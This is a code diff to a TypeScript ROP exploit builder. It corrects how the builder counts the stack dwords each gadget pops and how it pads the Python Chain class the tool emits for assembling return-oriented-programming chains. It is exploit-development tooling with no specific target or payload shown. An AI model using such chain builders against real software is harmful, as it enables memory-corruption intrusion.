@@ -99,7 +99,9 @@ export function lastRetN(gadget: RopGadget): number {
   return parseInt(last.operands[0], last.operands[0].indexOf("0x") === 0 ? 16 : 10) || 0;
 }
 
-// Stack dwords the gadget takes beyond the values it is given, counted until it moves ESP.
+// Stack dwords the gadget takes beyond the values it is given, counted until it moves ESP. `loads` is
+// 0 at every call site that records a cost, because a cost row is read by every call of that gadget and
+// a count of leftovers is only right for the one call site it was measured at.
 export function extraPops(gadget: RopGadget, loads: number): number {
   let pops = 0;
   for (const instruction of gadget.instructions) {
@@ -232,7 +234,7 @@ export function buildExploit(input: BuildInput): Build {
       .map((verdict) => ({
         address: gadgetAddress(verdict.gadget),
         sequence: sequence(verdict.gadget),
-        pops: extraPops(verdict.gadget, loads),
+        pops: extraPops(verdict.gadget, 0),
         retn: lastRetN(verdict.gadget),
         why: sideEffects(verdict.gadget, plan.job),
       }))
@@ -257,7 +259,7 @@ export function buildExploit(input: BuildInput): Build {
     return entry;
   };
   const entry = (gadget: RopGadget, job: string, loads = 0): Entry =>
-    row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, loads), lastRetN(gadget), loads);
+    row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, 0), lastRetN(gadget), loads);
 
   // Names exist only once the table is complete, so ops hold entries and lines hold tokens.
   const refs: Entry[] = [];
@@ -425,7 +427,7 @@ export function buildExploit(input: BuildInput): Build {
         .filter((alt) => input.exclude.indexOf(gadgetAddress(alt.gadget)) < 0)
         .map((alt) => ({
           address: gadgetAddress(alt.gadget), sequence: sequence(alt.gadget),
-          pops: extraPops(alt.gadget, values.length), retn: lastRetN(alt.gadget), why: alt.why,
+          pops: extraPops(alt.gadget, 0), retn: lastRetN(alt.gadget), why: alt.why,
         })));
       ops.push({ call: row, values, note: hop.notes.join("; ") });
     }
@@ -831,18 +833,20 @@ export function buildExploit(input: BuildInput): Build {
         ]),
         `COST = {${[
           ...cost.map((entry) => `${entry.name}: (${entry.pops}, ${entry.retn ? `0x${entry.retn.toString(16)}` : 0})`),
-          ...table.flatMap((entry) => swapsFor(entry.address, entry.loads)
-            .filter((swap) => swap.pops > 0 || swap.retn > 0)
-            .map((swap) => `${hex(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`)),
-        ].join(", ")}}     # (extra pops, ret N). The swap-ins are here too, so swapping one in needs no other edit.`,
+          ...table.flatMap((entry) => swapsFor(entry.address, entry.loads))
+            .filter((swap, i, all) => (swap.pops > 0 || swap.retn > 0)
+              && table.every((entry) => entry.address !== swap.address)
+              && all.findIndex((other) => other.address === swap.address) === i)
+            .map((swap) => `${hex(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`),
+        ].join(", ")}}     # (the stack dwords each one takes, ret N). The swap-ins are here too, so swapping one in needs no other edit.`,
         `PAD = b"\\x${(JUNK & 0xff).toString(16).padStart(2, "0")}"                   # the byte the payload pads with, not a bad char`,
         "JUNK = int.from_bytes(PAD * 4, \"little\")   # and the junk dword made of it",
         "",
-        "class Chain(list):                # c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for its extra pops",
+        "class Chain(list):                # c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for the dwords it pops past them",
         "    skip, patches = 0, None",
         "    def rop(self, gadget, *values):",
         "        pops, retn = COST.get(gadget, (0, 0))",
-        "        self.extend([gadget] + [JUNK] * (self.skip // 4) + list(values) + [JUNK] * pops)",
+        "        self.extend([gadget] + [JUNK] * (self.skip // 4) + list(values) + [JUNK] * max(0, pops - len(values)))",
         "        self.skip, self.patches = retn, self.patches or []",
       ] },
       5: { lines: [
